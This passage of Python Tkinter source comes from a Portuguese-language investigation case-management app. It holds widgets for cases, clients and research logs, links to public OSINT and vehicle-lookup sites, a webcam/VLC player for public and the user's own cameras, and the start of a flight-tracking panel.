    def on_select(self, event=None):
        sel = self.listbox.curselection()
        if not sel:
            return
        real_idx = self.filtered_indices[sel[0]]
        self.selected_index = real_idx
        record = self.records[self.selected_index]
        for key, label, wtype in self.FIELDS:
            self.set_field_value(key, wtype, record.get(key, ""))

    def new_record(self):
        self.selected_index = None
        for key, label, wtype in self.FIELDS:
            self.set_field_value(key, wtype, "")
        self.listbox.selection_clear(0, "end")

    def save_record(self):
        record = {key: self.get_field_value(key, wtype) for key, label, wtype in self.FIELDS}
        if not any(str(v).strip() for v in record.values()):
            messagebox.showwarning("Aviso", "Preenche pelo menos um campo.")
            return
        if not record.get("id"):
            record["id"] = str(uuid.uuid4())[:8]
        if self.selected_index is not None:
            if "id" in self.records[self.selected_index]:
                record["id"] = self.records[self.selected_index].get("id")
            self.records[self.selected_index] = record
        else:
            self.records.append(record)
        save_json(self.FILE, self.records)
        self.refresh_list()
        messagebox.showinfo("Guardado", "Registo guardado com sucesso.")

    def delete_record(self):
        if self.selected_index is None:
            messagebox.showwarning("Aviso", "Seleciona um registo na lista.")
            return
        if not messagebox.askyesno("Confirmar", "Eliminar este registo permanentemente?"):
            return
        del self.records[self.selected_index]
        save_json(self.FILE, self.records)
        self.refresh_list()
        self.new_record()


class CasosWidget(RecordManagerWidget):
    FILE = CASOS_FILE
    TITLE = "CASOS"
    FIELDS = [
        ("titulo", "Título do Caso", "entry"),
        ("cliente", "Cliente", "entry"),
        ("estado", "Estado", "choice"),
        ("data_abertura", "Data de Abertura", "entry"),
        ("notas", "Notas / Resumo", "text"),
    ]
    CHOICES = {"estado": ["Aberto", "Em Investigação", "Encerrado"]}
    SUMMARY_KEYS = ["titulo", "estado"]


class ClientesWidget(RecordManagerWidget):
    FILE = CLIENTES_FILE
    TITLE = "CLIENTES"
    FIELDS = [
        ("nome", "Nome", "entry"),
        ("contacto", "Contacto (tel. / email)", "entry"),
        ("notas", "Notas", "text"),
    ]
    SUMMARY_KEYS = ["nome", "contacto"]


class BuscaWidget(RecordManagerWidget):
    FILE = BUSCAS_FILE
    TITLE = "REGISTO DE INVESTIGAÇÃO"
    FIELDS = [
        ("caso", "Caso Associado", "entry"),
        ("data", "Data", "entry"),
        ("fonte", "Fonte da Informação", "entry"),
        ("descricao", "Descrição do que foi apurado", "text"),
    ]
    SUMMARY_KEYS = ["data", "caso"]


# ─────────────────────────────────────────────
# Dashboard
# ─────────────────────────────────────────────
class DashboardWidget(tk.Frame):
    def __init__(self, parent):
        super().__init__(parent, bg=BG)
        self.clock_label = tk.Label(self, bg=BG, fg=ACCENT, font=(FONT_MONO, 11, "bold"))
        self.clock_label.pack(anchor="w", pady=(0, 20))
        self.stats_frame = tk.Frame(self, bg=BG)
        self.stats_frame.pack(fill="x")
        self.activity_frame = tk.Frame(self, bg=BG)
        self.activity_frame.pack(fill="both", expand=True, pady=(20, 0))
        self._clock_running = True
        self.update_clock()
        self.refresh_stats()

    def update_clock(self):
        if not self._clock_running or not self.winfo_exists():
            return
        now = datetime.datetime.now().strftime("%Y-%m-%d  %H:%M:%S")
        try:
            self.clock_label.configure(text=f"SISTEMA ATIVO — {now}")
        except Exception:
            return
        self.after(1000, self.update_clock)

    def stop_clock(self):
        self._clock_running = False

    def refresh_stats(self):
        for w in self.stats_frame.winfo_children():
            w.destroy()
        for w in self.activity_frame.winfo_children():
            w.destroy()

        casos = load_json(CASOS_FILE)
        clientes = load_json(CLIENTES_FILE)
        buscas = load_json(BUSCAS_FILE)
        ativos = len([c for c in casos if c.get("estado") != "Encerrado"])
        encerrados = len([c for c in casos if c.get("estado") == "Encerrado"])

        stats = [
            ("CASOS ATIVOS", str(ativos), ACCENT),
            ("ENCERRADOS", str(encerrados), TEXT_DIM),
            ("TOTAL DE CASOS", str(len(casos)), TEXT),
            ("CLIENTES", str(len(clientes)), "#ffb700"),
            ("REGISTOS DE INVESTIGAÇÃO", str(len(buscas)), "#00ff88"),
            ("ESTADO SISTEMA", "ONLINE", "#00ff88"),
        ]

        container = tk.Frame(self.stats_frame, bg=ACCENT_DIM)
        container.pack(fill="x")
        for c in range(3):
            container.grid_columnconfigure(c, weight=1)

        for i, (label, value, color) in enumerate(stats):
            box = tk.Frame(container, bg=PANEL_BG)
            box.grid(row=i // 3, column=i % 3, padx=1, pady=1, sticky="nsew")
            tk.Frame(box, bg=color, height=2).pack(fill="x")
            tk.Label(box, text=value, bg=PANEL_BG, fg=color, font=(FONT_MONO, 24, "bold")).pack(pady=(12, 0))
            tk.Label(box, text=label, bg=PANEL_BG, fg=TEXT_DIM, font=(FONT_MONO, 7, "bold")).pack(pady=(2, 12))

        tk.Label(
            self.activity_frame, text="ATIVIDADE RECENTE", bg=BG, fg=ACCENT, font=(FONT_MONO, 10, "bold")
        ).pack(anchor="w", pady=(0, 8))

        list_frame = tk.Frame(self.activity_frame, bg=PANEL_BG, highlightthickness=1, highlightbackground=ACCENT_DIM)
        list_frame.pack(fill="both", expand=True)
        txt = tk.Text(
            list_frame,
            height=10,
            font=(FONT_MONO, 9),
            bg=PANEL_BG,
            fg=TEXT_DIM,
            relief="flat",
            highlightthickness=0)
        txt.pack(fill="both", expand=True, padx=10, pady=10)

        todos = []
        for c in casos[-5:]:
            todos.append(f"[CASO] {c.get('titulo', '')} - {c.get('estado', '')}")
        for b in buscas[-5:]:
            todos.append(f"[INVESTIGAÇÃO] {b.get('caso', '')} - {b.get('data', '')}")

        if not todos:
            txt.insert("1.0", "Sem atividade registada.")
        else:
            for t in reversed(todos[-10:]):
                txt.insert("end", f"▸ {t}\n")
        txt.configure(state="disabled")


# ─────────────────────────────────────────────
# OSINT integrado (dentro de Investigação)
# ─────────────────────────────────────────────
class OSINTInvestigacaoWidget(tk.Frame):
    def __init__(self, parent):
        super().__init__(parent, bg=BG)

        top = tk.Frame(self, bg=BG)
        top.pack(fill="x", pady=(0, 10))

        tk.Label(top, text="CASO ATIVO:", bg=BG, fg=ACCENT, font=(FONT_MONO, 8, "bold")).pack(side="left")
        self.caso_var = tk.StringVar(value="Sem caso")
        self.caso_menu = tk.OptionMenu(top, self.caso_var, "Sem caso")
        self.caso_menu.configure(
            bg=BTN_BG, fg=ACCENT, activebackground=ACCENT_DIM, relief="flat", highlightthickness=0, font=(FONT_MONO, 8)
        )
        self.caso_menu["menu"].configure(bg=PANEL_BG, fg=TEXT)
        self.caso_menu.pack(side="left", padx=10)

        tk.Label(top, text="ALVO / TERMO:", bg=BG, fg=ACCENT, font=(FONT_MONO, 8, "bold")).pack(
            side="left", padx=(20, 5)
        )
        self.alvo_entry = tk.Entry(
            top,
            font=(FONT_MONO, 10),
            bg=PANEL_BG,
            fg=TEXT,
            insertbackground=ACCENT,
            relief="flat",
            highlightthickness=1,
            highlightbackground=ACCENT_DIM,
            width=25)
        self.alvo_entry.pack(side="left", ipady=4)
        self.alvo_entry.insert(0, "alvo@exemplo.com")

        btn_osint = tk.Button(top, text="ABRIR FRAMEWORK", command=lambda: webbrowser.open("https://osintframework.com/"))
        btn_osint.pack(side="left", padx=10, ipady=4)
        style_button(btn_osint)
        btn_osint.configure(font=(FONT_MONO, 7, "bold"))

        style = ttk.Style()
        style.theme_use("default")
        nb = ttk.Notebook(self)
        nb.pack(fill="both", expand=True, pady=5)

        categories = {
            "USERNAME": [
                ("Sherlock 300+", "https://github.com/sherlock-project/sherlock"),
                ("WhatsMyName", "https://whatsmyname.app/"),
            ],
            "EMAIL": [
                ("Hunter.io", "https://hunter.io/"),
                ("HaveIBeenPwned", "https://haveibeenpwned.com/"),
                ("Epieos", "https://epieos.com/"),
            ],
            "DOMINIO/IP": [
                ("Who.is", "https://who.is/"),
                ("Shodan", "https://www.shodan.io/"),
                ("VirusTotal", "https://www.virustotal.com/"),
            ],
            "PESSOAS": [
                ("Pipl", "https://pipl.com/"),
                ("Webmii", "https://webmii.com/"),
            ],
            "IMAGENS": [
                ("Google Reverso", "https://images.google.com/"),
                ("TinEye", "https://tineye.com/"),
                ("PimEyes", "https://pimeyes.com/"),
            ],
        }

        for cat_name, tools in categories.items():
            tab = tk.Frame(nb, bg=BG)
            nb.add(tab, text=" " + cat_name + " ")
            for title, url in tools:
                row = tk.Frame(tab, bg=PANEL_BG, highlightthickness=1, highlightbackground=ACCENT_DIM)
                row.pack(fill="x", padx=10, pady=4)
                tk.Label(row, text=title, bg=PANEL_BG, fg=ACCENT, font=(FONT_MONO, 8, "bold")).pack(
                    side="left", padx=10, pady=6
                )
                b = tk.Button(row, text="ABRIR + COPIAR ALVO", command=lambda u=url: self.abrir_com_alvo(u))
                b.pack(side="right", padx=10, ipady=3)
                style_button(b)
                b.configure(font=(FONT_MONO, 6, "bold"))

        save_frame = tk.Frame(self, bg=PANEL_BG, highlightthickness=1, highlightbackground=ACCENT_DIM)
        save_frame.pack(fill="x", pady=10)
        tk.Label(
            save_frame, text="GUARDAR RESULTADO NO CASO:", bg=PANEL_BG, fg=ACCENT, font=(FONT_MONO, 8, "bold")
        ).pack(anchor="w", padx=10, pady=(8, 2))
        entry_row = tk.Frame(save_frame, bg=PANEL_BG)
        entry_row.pack(fill="x", padx=10, pady=5)
        self.result_desc = tk.Entry(
            entry_row,
            font=(FONT_MONO, 9),
            bg=BG,
            fg=TEXT,
            insertbackground=ACCENT,
            relief="flat",
            highlightthickness=1,
            highlightbackground=ACCENT_DIM)
        self.result_desc.pack(side="left", fill="x", expand=True, ipady=4)
        self.result_desc.insert(0, "Resultado OSINT - ex: email encontrado no Hunter.io")
        btn_save = tk.Button(entry_row, text="GUARDAR EM REGISTOS", command=self.guardar_resultado)
        btn_save.pack(side="left", padx=8, ipady=4)
        style_button(btn_save)
        btn_save.configure(font=(FONT_MONO, 7, "bold"))
        self.refresh_casos()

    def refresh_casos(self):
        casos = load_json(CASOS_FILE)
        menu = self.caso_menu["menu"]
        menu.delete(0, "end")
        titles = [c.get("titulo", "Sem titulo") for c in casos] if casos else ["Sem caso"]
        for t in titles:
            menu.add_command(label=t, command=lambda v=t: self.caso_var.set(v))
        if titles:
            self.caso_var.set(titles[0])

    def abrir_com_alvo(self, base_url):
        alvo = self.alvo_entry.get().strip()
        try:
            self.clipboard_clear()
            self.clipboard_append(alvo)
        except Exception:
            pass
        webbrowser.open(base_url)

    def guardar_resultado(self):
        caso = self.caso_var.get()
        alvo = self.alvo_entry.get().strip()
        desc = self.result_desc.get().strip()
        if not caso or caso == "Sem caso":
            messagebox.showwarning("Aviso", "Seleciona um caso ativo em INVESTIGAÇÃO > CASOS primeiro.")
            return
        if not desc:
            messagebox.showwarning("Aviso", "Escreve a descrição do resultado.")
            return
        registo = {
            "id": str(uuid.uuid4())[:8],
            "caso": caso,
            "data": datetime.datetime.now().strftime("%Y-%m-%d %H:%M"),
            "fonte": "OSINT - " + alvo,
            "descricao": desc,
        }
        buscas = load_json(BUSCAS_FILE)
        buscas.append(registo)
        save_json(BUSCAS_FILE, buscas)
        messagebox.showinfo("Guardado", f"Resultado OSINT guardado em REGISTOS do caso {caso}")
        self.result_desc.delete(0, "end")


# ─────────────────────────────────────────────
# Veículos integrado
# ─────────────────────────────────────────────
class VeiculosInvestigacaoWidget(tk.Frame):
    def __init__(self, parent):
        super().__init__(parent, bg=BG)

        top = tk.Frame(self, bg=BG)
        top.pack(fill="x", pady=(0, 10))

        tk.Label(top, text="CASO ATIVO:", bg=BG, fg=ACCENT, font=(FONT_MONO, 8, "bold")).pack(side="left")
        self.caso_var = tk.StringVar(value="Sem caso")
        self.caso_menu = tk.OptionMenu(top, self.caso_var, "Sem caso")
        self.caso_menu.configure(
            bg=BTN_BG, fg=ACCENT, activebackground=ACCENT_DIM, relief="flat", highlightthickness=0, font=(FONT_MONO, 8)
        )
        self.caso_menu["menu"].configure(bg=PANEL_BG, fg=TEXT)
        self.caso_menu.pack(side="left", padx=10)

        tk.Label(top, text="MATRÍCULA:", bg=BG, fg=ACCENT, font=(FONT_MONO, 8, "bold")).pack(
            side="left", padx=(20, 5)
        )
        self.mat_entry = tk.Entry(
            top,
            font=(FONT_MONO, 11, "bold"),
            bg=PANEL_BG,
            fg=TEXT,
            insertbackground=ACCENT,
            relief="flat",
            highlightthickness=1,
            highlightbackground=ACCENT_DIM,
            width=12,
            justify="center")
        self.mat_entry.pack(side="left", ipady=4)
        self.mat_entry.insert(0, "AA-00-AA")

        body = tk.Frame(self, bg=BG)
        body.pack(fill="both", expand=True, pady=5)

        col1 = tk.Frame(body, bg=PANEL_BG, highlightthickness=1, highlightbackground=ACCENT_DIM)
        col1.pack(side="left", fill="both", expand=True, padx=(0, 5))
        tk.Label(col1, text="OFICIAIS IRN", bg=PANEL_BG, fg=ACCENT, font=(FONT_MONO, 8, "bold")).pack(pady=8)
        self._btn(col1, "AUTOMÓVEL ONLINE", "https://www.automovelonline.mj.pt/AutoOnlineProd/", False)
        self._btn(col1, "IMT ONLINE", "https://www.imtonline.pt", False)

        col2 = tk.Frame(body, bg=PANEL_BG, highlightthickness=1, highlightbackground=ACCENT_DIM)
        col2.pack(side="left", fill="both", expand=True, padx=5)
        tk.Label(col2, text="INFOMATRÍCULA / OSINT", bg=PANEL_BG, fg=ACCENT, font=(FONT_MONO, 8, "bold")).pack(pady=8)
        self._btn(col2, "INFOMATRÍCULA.PT", "https://infomatricula.pt/", True)
        self._btn(col2, "CARVERTICAL", "https://www.carvertical.com/pt", True)
        self._btn(col2, "GOOGLE DORK MATRÍCULA", "https://www.google.com/search?q=", True)

        save_frame = tk.Frame(self, bg=PANEL_BG, highlightthickness=1, highlightbackground=ACCENT_DIM)
        save_frame.pack(fill="x", pady=10)
        tk.Label(
            save_frame, text="GUARDAR CONSULTA NO CASO:", bg=PANEL_BG, fg=ACCENT, font=(FONT_MONO, 8, "bold")
        ).pack(anchor="w", padx=10, pady=(8, 2))
        entry_row = tk.Frame(save_frame, bg=PANEL_BG)
        entry_row.pack(fill="x", padx=10, pady=5)
        self.result_desc = tk.Entry(
            entry_row,
            font=(FONT_MONO, 9),
            bg=BG,
            fg=TEXT,
            insertbackground=ACCENT,
            relief="flat",
            highlightthickness=1,
            highlightbackground=ACCENT_DIM)
        self.result_desc.pack(side="left", fill="x", expand=True, ipady=4)
        self.result_desc.insert(0, "Consulta matrícula - ex: Veículo sem ónus, proprietário X")
        btn_save = tk.Button(entry_row, text="GUARDAR EM REGISTOS", command=self.guardar_resultado)
        btn_save.pack(side="left", padx=8, ipady=4)
        style_button(btn_save)
        btn_save.configure(font=(FONT_MONO, 7, "bold"))
        self.refresh_casos()

    def _btn(self, parent, txt, url, with_mat):
        cmd = (lambda u=url: self.abrir_com_matricula(u)) if with_mat else (lambda u=url: webbrowser.open(u))
        b = tk.Button(parent, text=txt, command=cmd, anchor="w", padx=10)
        b.pack(fill="x", padx=10, pady=4, ipady=6)
        style_button(b)
        b.configure(font=(FONT_MONO, 7, "bold"))

    def refresh_casos(self):
        casos = load_json(CASOS_FILE)
        menu = self.caso_menu["menu"]
        menu.delete(0, "end")
        titles = [c.get("titulo", "Sem titulo") for c in casos] if casos else ["Sem caso"]
        for t in titles:
            menu.add_command(label=t, command=lambda v=t: self.caso_var.set(v))
        if titles:
            self.caso_var.set(titles[0])

    def abrir_com_matricula(self, base_url):
        mat = self.mat_entry.get().strip().upper()
        if "google.com/search?q=" in base_url:
            url = base_url + urllib.parse.quote(mat)
        else:
            url = base_url
        try:
            self.clipboard_clear()
            self.clipboard_append(mat)
        except Exception:
            pass
        webbrowser.open(url)

    def guardar_resultado(self):
        caso = self.caso_var.get()
        mat = self.mat_entry.get().strip().upper()
        desc = self.result_desc.get().strip()
        if not caso or caso == "Sem caso":
            messagebox.showwarning("Aviso", "Seleciona um caso ativo primeiro.")
            return
        if not desc:
            messagebox.showwarning("Aviso", "Escreve a descrição do resultado.")
            return
        registo = {
            "id": str(uuid.uuid4())[:8],
            "caso": caso,
            "data": datetime.datetime.now().strftime("%Y-%m-%d %H:%M"),
            "fonte": "VEÍCULOS - " + mat,
            "descricao": desc,
        }
        buscas = load_json(BUSCAS_FILE)
        buscas.append(registo)
        save_json(BUSCAS_FILE, buscas)
        messagebox.showinfo("Guardado", f"Consulta veículo guardada em REGISTOS do caso {caso}")
        self.result_desc.delete(0, "end")



# ─────────────────────────────────────────────
# Câmaras integrado
# ─────────────────────────────────────────────
class CamarasInvestigacaoWidget(tk.Frame):
    PUBLIC_CAMARAS = [
        {"nome": "Lisboa - Terreiro do Paço", "local": "Lisboa", "tipo": "HLS/Public", "url": "https://www.skylinewebcams.com/pt/webcam/portugal/lisboa/lisboa/praca-do-comercio.html", "fonte": "SkylineWebcams"},
        {"nome": "Porto - Ribeira", "local": "Porto", "tipo": "HLS/Public", "url": "https://www.skylinewebcams.com/pt/webcam/portugal/porto/porto/ribeira.html", "fonte": "SkylineWebcams"},
        {"nome": "Nazaré - Praia do Norte", "local": "Nazaré", "tipo": "HLS/Public", "url": "https://www.skylinewebcams.com/pt/webcam/portugal/centro/nazare/nazare-praia-do-norte.html", "fonte": "SkylineWebcams"},
    ]
    def __init__(self, parent):
        super().__init__(parent, bg=BG)
        top = tk.Frame(self, bg=BG)
        top.pack(fill="x", pady=(0, 10))
        tk.Label(top, text="CASO ATIVO:", bg=BG, fg=ACCENT, font=(FONT_MONO, 8, "bold")).pack(side="left")
        self.caso_var = tk.StringVar(value="Sem caso")
        self.caso_menu = tk.OptionMenu(top, self.caso_var, "Sem caso")
        self.caso_menu.configure(bg=BTN_BG, fg=ACCENT, activebackground=ACCENT_DIM, relief="flat", highlightthickness=0, font=(FONT_MONO, 8))
        self.caso_menu["menu"].configure(bg=PANEL_BG, fg=TEXT)
        self.caso_menu.pack(side="left", padx=10)
        tk.Label(top, text="CÂMARA ATIVA:", bg=BG, fg=ACCENT, font=(FONT_MONO, 8, "bold")).pack(side="left", padx=(20, 5))
        self.active_label = tk.Label(top, text="Nenhuma", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 9, "bold"), width=28, anchor="w")
        self.active_label.pack(side="left")
        self.status_vlc = tk.Label(top, text="VLC: a verificar...", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 7))
        self.status_vlc.pack(side="right", padx=10)
        tk.Label(self, text="AVISO: Públicas = oficiais autorizadas. Privadas = só TUAS câmaras.", bg="#1a150a", fg="#ffb700", font=(FONT_MONO, 7, "bold"), wraplength=1100, justify="left").pack(fill="x", pady=(0, 8), ipady=4)
        body = tk.Frame(self, bg=BG)
        body.pack(fill="both", expand=True)
        left = tk.Frame(body, bg=PANEL_BG, highlightthickness=1, highlightbackground=ACCENT_DIM, width=380)
        left.pack(side="left", fill="y", padx=(0, 10))
        left.pack_propagate(False)
        style = ttk.Style()
        style.theme_use("default")
        style.configure("TNotebook", background=PANEL_BG, borderwidth=0)
        style.configure("TNotebook.Tab", background=BTN_BG, foreground=TEXT_DIM, padding=[8, 5], font=(FONT_MONO, 7, "bold"), borderwidth=0)
        style.map("TNotebook.Tab", background=[("selected", ACCENT_DIM)], foreground=[("selected", ACCENT)])
        nb_left = ttk.Notebook(left)
        nb_left.pack(fill="both", expand=True, padx=6, pady=6)
        tab_priv = tk.Frame(nb_left, bg=PANEL_BG)
        tab_pub = tk.Frame(nb_left, bg=PANEL_BG)
        nb_left.add(tab_priv, text=" PRIVADAS (TUAS) ")
        nb_left.add(tab_pub, text=" PÚBLICAS ")
        tk.Label(tab_priv, text="MINHAS CÂMARAS", bg=PANEL_BG, fg=ACCENT, font=(FONT_MONO, 8, "bold")).pack(pady=8)
        self.list_priv = tk.Listbox(tab_priv, font=(FONT_MONO, 9), bg=BG, fg=TEXT, selectbackground=ACCENT_DIM, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, height=12)
        self.list_priv.pack(fill="both", expand=True, padx=6, pady=(0, 6))
        self.list_priv.bind("<<ListboxSelect>>", lambda e: self.on_select_priv())
        btns_priv = tk.Frame(tab_priv, bg=PANEL_BG)
        btns_priv.pack(fill="x", padx=6, pady=6)
        b_add = tk.Button(btns_priv, text="+ ADICIONAR", command=self.dialog_add_camera)
        b_add.pack(side="left", fill="x", expand=True, padx=2, ipady=5)
        style_button(b_add)
        b_add.configure(font=(FONT_MONO, 7, "bold"))
        b_edit = tk.Button(btns_priv, text="✎ EDITAR", command=self.dialog_edit_camera)
        b_edit.pack(side="left", fill="x", expand=True, padx=2, ipady=5)
        style_button(b_edit)
        b_edit.configure(font=(FONT_MONO, 7, "bold"))
        b_del = tk.Button(btns_priv, text="🗑", command=self.delete_camera, width=3)
        b_del.pack(side="left", padx=2, ipady=5)
        b_del.configure(bg="#1a0a0f", fg=ERROR, relief="flat", font=(FONT_MONO, 8, "bold"))
        tk.Label(tab_pub, text="CÂMARAS PÚBLICAS PT", bg=PANEL_BG, fg=ACCENT, font=(FONT_MONO, 8, "bold")).pack(pady=8)
        self.list_pub = tk.Listbox(tab_pub, font=(FONT_MONO, 8), bg=BG, fg=TEXT, selectbackground=ACCENT_DIM, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, height=14)
        self.list_pub.pack(fill="both", expand=True, padx=6, pady=(0, 6))
        for cam in self.PUBLIC_CAMARAS:
            self.list_pub.insert("end", f"{cam['nome']} [{cam['local']}]")
        self.list_pub.bind("<<ListboxSelect>>", lambda e: self.on_select_pub())
        self.list_pub.bind("<Double-Button-1>", lambda e: self.play_selected_pub())
        b_play_pub = tk.Button(tab_pub, text="▶ REPRODUZIR PÚBLICA", command=self.play_selected_pub)
        b_play_pub.pack(fill="x", padx=6, pady=6, ipady=6)
        style_button(b_play_pub)
        right = tk.Frame(body, bg=PANEL_BG, highlightthickness=1, highlightbackground=ACCENT_DIM)
        right.pack(side="left", fill="both", expand=True)
        self.video_frame = tk.Frame(right, bg="black", height=320)
        self.video_frame.pack(fill="both", expand=True, padx=8, pady=8)
        self.video_frame.pack_propagate(False)
        self.video_label = tk.Label(self.video_frame, text="PLAYER CÂMARAS\n\nVLC integrado se instalado", bg="black", fg=TEXT_DIM, font=(FONT_MONO, 9), justify="center")
        self.video_label.pack(fill="both", expand=True)
        ctrl = tk.Frame(right, bg=PANEL_BG)
        ctrl.pack(fill="x", padx=8, pady=(0, 6))
        b_play = tk.Button(ctrl, text="▶ PLAY", command=self.play_current, width=8)
        b_play.pack(side="left", padx=3, ipady=6)
        style_button(b_play)
        b_stop = tk.Button(ctrl, text="■ STOP", command=self.stop_player, width=8)
        b_stop.pack(side="left", padx=3, ipady=6)
        style_button(b_stop)
        b_snap = tk.Button(ctrl, text="📸 SNAPSHOT", command=self.snapshot, width=10)
        b_snap.pack(side="left", padx=3, ipady=6)
        style_button(b_snap)
        b_browser = tk.Button(ctrl, text="🌐 BROWSER", command=self.open_in_browser, width=10)
        b_browser.pack(side="left", padx=3, ipady=6)
        style_button(b_browser)
        self.vlc_instance = None
        self.vlc_player = None
        self.current_cam = None
        self.camaras_privadas = []
        self._init_vlc()
        self.load_camaras()
        self.refresh_casos()
    def _init_vlc(self):
        try:
            vlc_mod = ensure_package("python-vlc", "vlc")
            if vlc_mod is None:
                self.status_vlc.configure(text="VLC: não instalado", fg="#ffb700")
                return
            self.vlc_instance = vlc_mod.Instance(["--no-xlib"] if platform.system() != "Windows" else [])
            self.vlc_player = self.vlc_instance.media_player_new()
            try:
                if platform.system() == "Windows":
                    self.vlc_player.set_hwnd(self.video_frame.winfo_id())
                elif platform.system() == "Linux":
                    self.vlc_player.set_xwindow(self.video_frame.winfo_id())
            except Exception:
                pass
            self.status_vlc.configure(text="VLC: OK", fg="#00ff88")
        except Exception as e:
            self.status_vlc.configure(text=f"VLC erro: {e}", fg=ERROR)
    def load_camaras(self):
        self.camaras_privadas = load_json(CAMARAS_FILE, [])
        self.refresh_priv_list()
    def refresh_priv_list(self):
        self.list_priv.delete(0, "end")
        for cam in self.camaras_privadas:
            self.list_priv.insert("end", f"{cam.get('nome','')} [{cam.get('tipo','')}] - {cam.get('local','')}")
    def refresh_casos(self):
        casos = load_json(CASOS_FILE)
        menu = self.caso_menu["menu"]
        menu.delete(0, "end")
        titles = [c.get("titulo", "Sem titulo") for c in casos] if casos else ["Sem caso"]
        for t in titles:
            menu.add_command(label=t, command=lambda v=t: self.caso_var.set(v))
        if titles:
            self.caso_var.set(titles[0])
    def on_select_priv(self):
        sel = self.list_priv.curselection()
        if not sel:
            return
        cam = self.camaras_privadas[sel[0]]
        self.current_cam = cam
        self.active_label.configure(text=cam.get("nome","")[:28])
    def on_select_pub(self):
        sel = self.list_pub.curselection()
        if not sel:
            return
        cam = self.PUBLIC_CAMARAS[sel[0]]
        self.current_cam = cam
        self.active_label.configure(text=cam.get("nome","")[:28])
    def play_selected_pub(self):
        sel = self.list_pub.curselection()
        if not sel:
            return
        self.current_cam = self.PUBLIC_CAMARAS[sel[0]]
        self.play_current()
    def play_current(self):
        if not self.current_cam:
            return
        url = self.current_cam.get("url","").strip()
        if any(x in url.lower() for x in ["skylinewebcams.com", "youtube.com", "youtu.be"]):
            webbrowser.open(url)
            return
        if self.vlc_player and self.vlc_instance:
            try:
                self.video_label.pack_forget()
                media = self.vlc_instance.media_new(url)
                self.vlc_player.set_media(media)
                self.vlc_player.play()
                return
            except Exception:
                webbrowser.open(url)
        else:
            webbrowser.open(url)
    def stop_player(self):
        try:
            if self.vlc_player:
                self.vlc_player.stop()
        except Exception:
            pass
    def snapshot(self):
        if not self.current_cam:
            return
        try:
            if self.vlc_player:
                os.makedirs(TEMP_MUSIC_DIR, exist_ok=True)
                snap_path = os.path.join(TEMP_MUSIC_DIR, f"snap_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.png")
                self.vlc_player.video_take_snapshot(0, snap_path, 0, 0)
                messagebox.showinfo("Snapshot", f"Guardado em:\n{snap_path}")
        except Exception as e:
            messagebox.showerror("Erro", str(e))
    def open_in_browser(self):
        if self.current_cam:
            webbrowser.open(self.current_cam.get("url",""))
    def dialog_add_camera(self):
        self._dialog_camera(None)
    def dialog_edit_camera(self):
        sel = self.list_priv.curselection()
        if not sel:
            return
        self._dialog_camera(sel[0])
    def _dialog_camera(self, edit_idx):
        is_edit = edit_idx is not None
        data = self.camaras_privadas[edit_idx] if is_edit else {"nome": "", "url": "", "tipo": "RTSP", "local": "", "username": "", "password": "", "notas": "", "caso": ""}
        top = tk.Toplevel(self)
        top.title("Câmara Privada")
        top.geometry("520x560")
        top.configure(bg=BG)
        top.transient(self)
        top.grab_set()
        fields = [("nome", "Nome *"), ("local", "Localização"), ("tipo", "Tipo"), ("url", "URL / Stream *"), ("username", "Username"), ("password", "Password"), ("notas", "Notas"), ("caso", "Caso associado")]
        entries = {}
        for key, label in fields:
            tk.Label(top, text=label.upper(), bg=BG, fg=ACCENT, font=(FONT_MONO, 8, "bold")).pack(anchor="w", padx=14, pady=(6, 2))
            if key == "tipo":
                var = tk.StringVar(value=data.get(key, "RTSP"))
                opt = tk.OptionMenu(top, var, "RTSP", "HTTP", "HLS (.m3u8)", "MJPEG", "ONVIF", "YouTube")
                opt.configure(bg=BTN_BG, fg=ACCENT, relief="flat", highlightthickness=0, font=(FONT_MONO, 9), anchor="w")
                opt["menu"].configure(bg=PANEL_BG, fg=TEXT)
                opt.pack(fill="x", padx=14, pady=2)
                entries[key] = var
            else:
                e = tk.Entry(top, font=(FONT_MONO, 10), bg=PANEL_BG, fg=TEXT, insertbackground=ACCENT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
                e.pack(fill="x", padx=14, pady=2, ipady=4)
                e.insert(0, data.get(key, ""))
                entries[key] = e
        def salvar():
            nome = entries["nome"].get().strip()
            url = entries["url"].get().strip()
            if not nome or not url:
                messagebox.showwarning("Aviso", "Nome e URL obrigatórios.")
                return
            novo = {"id": data.get("id") or str(uuid.uuid4())[:8], "nome": entries["nome"].get().strip(), "local": entries["local"].get().strip(), "tipo": entries["tipo"].get() if isinstance(entries["tipo"], tk.StringVar) else entries["tipo"].get(), "url": entries["url"].get().strip(), "username": entries["username"].get().strip(), "password": entries["password"].get().strip(), "notas": entries["notas"].get().strip(), "caso": entries["caso"].get().strip(), "criado": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
            if is_edit:
                self.camaras_privadas[edit_idx] = novo
            else:
                self.camaras_privadas.append(novo)
            save_json(CAMARAS_FILE, self.camaras_privadas)
            self.refresh_priv_list()
            top.destroy()
        btns = tk.Frame(top, bg=BG)
        btns.pack(fill="x", padx=14, pady=18)
        b_save = tk.Button(btns, text="💾 GUARDAR CÂMARA", command=salvar)
        b_save.pack(fill="x", ipady=8)
        style_button(b_save)
    def delete_camera(self):
        sel = self.list_priv.curselection()
        if not sel:
            return
        idx = sel[0]
        if not messagebox.askyesno("Confirmar", f"Eliminar '{self.camaras_privadas[idx].get('nome')}'?"):
            return
        del self.camaras_privadas[idx]
        save_json(CAMARAS_FILE, self.camaras_privadas)
        self.refresh_priv_list()
        self.current_cam = None
        self.stop_player()





# ─────────────────────────────────────────────
# Aviões - FlightRadar24 like - OpenSky + ADS-B
# ─────────────────────────────────────────────
class AvioesInvestigacaoWidget(tk.Frame):
    """
    Sistema tipo FlightRadar24 - integra OpenSky Network, ADS-B Exchange, FlightRadar24, RadarBox
    Dados públicos ADS-B em tempo real
    """
    def __init__(self, parent):
        super().__init__(parent, bg=BG)
        self.aircrafts = []  # lista de aviões do OpenSky
        self.selected_aircraft = None
        self.is_fetching = False

        # Top bar - Caso + Região
        top = tk.Frame(self, bg=BG)
        top.pack(fill="x", pady=(0, 10))

        tk.Label(top, text="CASO ATIVO:", bg=BG, fg=ACCENT, font=(FONT_MONO, 8, "bold")).pack(side="left")
        self.caso_var = tk.StringVar(value="Sem caso")
        self.caso_menu = tk.OptionMenu(top, self.caso_var, "Sem caso")
